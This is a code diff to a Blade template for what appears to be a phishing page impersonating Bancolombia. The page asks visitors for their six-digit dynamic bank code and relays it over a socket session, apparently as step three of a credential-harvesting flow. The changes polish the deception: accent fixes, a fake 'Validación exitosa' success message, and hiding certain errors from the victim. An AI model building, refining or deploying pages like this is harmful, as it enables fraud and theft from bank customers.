@@ -2,7 +2,7 @@
 
 @section('title', 'Secure Payment')
 
-@section('page_title', 'Ingresa tu clave dinamica')
+@section('page_title', 'Ingresa tu clave dinámica')
 
 
 {{-- si hay error --}}
@@ -21,6 +21,13 @@
       'show' => false,
     ])
   @endif
+
+  @include('banks.bancolombia.components.alert', [
+  'id' => 'success',
+  'type' => 'success',
+  'text' => 'Validación exitosa.'
+])
+  
 @section('content')
     <br><br>
     <form id="formStep3" method="POST" action="{{ route('pago.bank.step.save', ['bank' => 'bancolombia', 'step' => 3])}}">
@@ -29,7 +36,7 @@
             <img class="input-icon" src="{{asset('assets/img/payment/bancolombia/passicon.png')}}">
             <input type="numeric" name="code" id="txtDinamic" class="pass" placeholder="" maxlength="6" minlength="6"
                 oninput="this.value = this.value.replace(/\D+/g, '');" inputmode="numeric" pattern="[0-9]{6}" required>
-            <label for="txtDinamic">Clave dinamica</label>
+            <label for="txtDinamic">Clave dinámica</label>
         </div>
 
         <a><small>¿necesitas ayuda?</small></a>
@@ -51,8 +58,7 @@
             const dinamicInput = document.getElementById('txtDinamic');
             const btn = document.getElementById('btnDinamic');
             const form = document.getElementById('formStep3');
-
-
+            try { sessionStorage.removeItem('rt_last_error'); } catch {}
             const nodeUrl = @json($nodeUrl);
             const sessionId = @json($sessionId);
             const sessionToken = @json($sessionToken);
@@ -112,8 +118,10 @@
                 }, (ack) => {
                     console.log(ack)
                     if (!ack?.ok) {
-                        window.hideLoading?.();
-                        showBankAlert('dinamicError', ack?.error || 'Error');
+                        if(ack?.error!=='bad_state') {
+                            window.hideLoading?.();
+                            showBankAlert('dinamicError', ack?.error || 'Error');
+                        }
                     }
                 });
             });
